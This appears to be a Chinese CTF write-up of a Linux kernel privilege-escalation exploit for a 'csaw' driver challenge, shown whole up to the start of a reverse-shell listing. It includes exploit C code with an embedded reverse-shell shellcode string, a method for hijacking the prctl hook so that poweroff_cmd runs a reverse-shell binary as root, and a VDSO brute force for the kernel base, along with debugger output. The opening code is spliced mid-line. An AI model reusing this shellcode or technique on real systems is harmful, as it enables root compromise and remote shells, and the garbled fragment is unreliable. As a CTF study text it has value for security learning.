        int fd = -1;
        size_t result = 0;
        struct alloc_channel_args alloc_args;
        struct shrink_channel_args shrink_args;
        struct seek_channel_args seek_args;
        struct read_channel_args read_args;
        struct close_channel_args close_args;
        struct write_channel_args write_args;
        size_t addr = 0xffffffff80000000;
        size_t real_cred = 0;
        size_t cred = 0;
        size_t target_addr ;
        int root_cred[12];
        char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
        //"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05";
        //set target in task_struct
        setvbuf(stdout, 0LL, 2, 0LL);
        char *buf = malloc(0x1000);
        char target[16];
        strcpy(target,"try2findmep4nda");
        prctl(PR_SET_NAME , target);
        fd = open("/dev/csaw",O_RDWR);
        if(fd comm)];
        long error;
        error = security_task_prctl(option, arg2, arg3, arg4, arg5);
        if (error != -ENOSYS)
            return error;
    ...
而security_task_prctl（\security\security.c）中通过hp->hook.task_prctl(option, arg2,
arg3, arg4,
arg5);将参数原封不动的传入hook进行处理，而这个hook位于内核的data段上，内核态有读写权限，因此可以通过修改这个位置劫持ptctl函数的执行流程：
    int security_task_prctl(int option, unsigned long arg2, unsigned long arg3,
                 unsigned long arg4, unsigned long arg5)
    {
        int thisrc;
        int rc = -ENOSYS;
        struct security_hook_list *hp;
        list_for_each_entry(hp, &security_hook_heads.task_prctl, list) {
            thisrc = hp->hook.task_prctl(option, arg2, arg3, arg4, arg5);
            if (thisrc != -ENOSYS) {
                rc = thisrc;
                if (thisrc != 0)
                    break;
            }
        }
        return rc;
    }
而在《New Reliable Android Kernel Root Exploitation
Techniques》提到了一个函数call_usermodehelper（\kernel\kmod.c
603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。但其中提到在安卓利用时需要关闭SEAndroid。另外，这个函数与execve函数参数相似，注意的是命令第一个参数必须是程序的全路径，而不能是相对路径，如"ls"必须写成"/bin/ls"，坑了好久...
起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp->hook.task_prctl(option, arg2, arg3,
arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。
    /**
     * call_usermodehelper() - prepare and start a usermode application
     * @path: path to usermode executable
     * @argv: arg vector for process
     * @envp: environment for process
     * @wait: wait for the application to finish and return status.
     *        when UMH_NO_WAIT don't wait at all, but you get no useful error back
     *        when the program couldn't be exec'ed. This makes it safe to call
     *        from interrupt context.
     *
     * This function is the equivalent to use call_usermodehelper_setup() and
     * call_usermodehelper_exec().
     */
    int call_usermodehelper(char *path, char **argv, char **envp, int wait)
    {
        struct subprocess_info *info;
        gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;
        info = call_usermodehelper_setup(path, argv, envp, gfp_mask,
                         NULL, NULL, NULL);
        if (info == NULL)
            return -ENOMEM;
        return call_usermodehelper_exec(info, wait);
    }
接下来就把视野转向这个函数还在哪里被调用，通过ida 的x命令可以找到一共被调用了四次。
    Down    p   tomoyo_load_policy+DD   call    near ptr call_usermodehelper-2E1792h
    Down    p   cgroup_release_agent+CC call    near ptr call_usermodehelper-7C191h
    Down    p   run_cmd+35  call    near ptr call_usermodehelper-0BF9Ah
    Up  p   mce_do_trigger+1B   call    call_usermodehelper+552B0h
tomoyo_load_policy（security\tomoyo\load_policy.c, line
84）和cgroup_release_agent（file kernel/cgroup.c, line 5753.）限制的比较死，就不赘述了。
mce_do_trigger（arch/x86/kernel/cpu/mcheck/mce.c, line
1323）的rdi、rsi两个参数也都是data段上的地址，可以通过任意写预先将要执行的命令布置在这个地址上，从而利用call_usermodehelper执行。但是要改的东西稍微多一点。
    static void mce_do_trigger(struct work_struct *work)
    {
        call_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);
    }
    pwndbg> x /10i mce_do_trigger
       0xffffffff810422b0 : data16 data16 data16 xchg ax,ax
       0xffffffff810422b5 :   push   rbp
       0xffffffff810422b6 :   xor    ecx,ecx
       0xffffffff810422b8 :   xor    edx,edx
       0xffffffff810422ba :  mov    rsi,
       0xffffffff810422c1 :  mov    rdi,0xffffffff8217ed20
       0xffffffff810422c8 :  mov    rbp,rsp
       0xffffffff810422cb :  call   0xffffffff81097580 
       0xffffffff810422d0 :  pop    rbp
       0xffffffff810422d1 :  ret    
    pwndbg> x /10s 0xffffffff8217ed20
    0xffffffff8217ed20 :    ""
    0xffffffff8217ed21 :  ""
    0xffffffff8217ed22 :  ""
    0xffffffff8217ed23 :  ""
    0xffffffff8217ed24 :  ""
    0xffffffff8217ed25 :  ""
    0xffffffff8217ed26 :  ""
    0xffffffff8217ed27 :  ""
    0xffffffff8217ed28 :  ""
    0xffffffff8217ed29 :  ""
    pwndbg> x /10gx 0xffffffff8217ed20
    0xffffffff8217ed20 :    0x0000000000000000  0x0000000000000000
    0xffffffff8217ed30 : 0x0000000000000000  0x0000000000000000
    0xffffffff8217ed40 : 0x0000000000000000  0x0000000000000000
    0xffffffff8217ed50 : 0x0000000000000000  0x0000000000000000
最后是run_cmd（kernel/reboot.c, line
393）这个函数就比较无脑了，里面会利用argv_split自动切割参数，但cmd还是存在参数截断的问题，继续查看调用可以发现reboot_work_func和poweroff_work_func两个函数都调用了run_cmd函数，并且内置的命令都是在内核里。
    static int run_cmd(const char *cmd)
    {
        char **argv;
        static char *envp[] = {
            "HOME=/",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL
        };
        int ret;
        argv = argv_split(GFP_KERNEL, cmd, NULL);
        if (argv) {
            ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
            argv_free(argv);
        } else {
            ret = -ENOMEM;
        }
        return ret;
    }
    Down    p   reboot_work_func+10 call    run_cmd
    Down    p   poweroff_work_func+18   call    run_cmd
这里又是一个坑，我起初用的reboot_work_func函数，但这个函数所用的reboot_cmd参数在.rodata段上，不具有写权限...
而poweroff_work_func函数的poweroff_cmd参数在.data段上可读可写（为啥要差别对待？？）。
    pwndbg> x /5i reboot_work_func
       0xffffffff810a3690 :   data16 data16 data16 xchg ax,ax
       0xffffffff810a3695 : push   rbp
       0xffffffff810a3696 : mov    rdi,0xffffffff81a26f80
       0xffffffff810a369d :    mov    rbp,rsp
       0xffffffff810a36a0 :    call   0xffffffff810a34e0 
    pwndbg> x /s 0xffffffff81a26f80
    0xffffffff81a26f80 :    "/sbin/reboot"
    pwndbg> x /7i poweroff_work_func
       0xffffffff810a39c0 : data16 data16 data16 xchg ax,ax
       0xffffffff810a39c5 :   push   rbp
       0xffffffff810a39c6 :   mov    rdi,0xffffffff81e4dfa0
       0xffffffff810a39cd :  mov    rbp,rsp
       0xffffffff810a39d0 :  push   rbx
       0xffffffff810a39d1 :  movzx  ebx,BYTE PTR [rip+0x1157ad8]        # 0xffffffff821fb4b0 
       0xffffffff810a39d8 :  call   0xffffffff810a34e0 
    pwndbg> x /s 0xffffffff81e4dfa0
    0xffffffff81e4dfa0 :  "/sbin/poweroff"
## 漏洞利用
首先可以利用VDSO的爆破得到VDSO的地址，而不难发现VDSO在vmlinux代码中，可以通过ida的可见字符串的__vdso_gettimeofday很容找到其偏移，从而得到kernel
base。
而得到kernel base之后，就可以找到需要覆写的hook位置和字符串地址了。
通过将prctl_hook覆写为poweroff_work_func地址，并将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。
在此处我没有调用selinux_disable就执行了call_usermodehelper，在我搭建的环境和强网杯solid_core给出的离线环境中都没有被selinux阻止。
## EXP
reverse_shell.c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 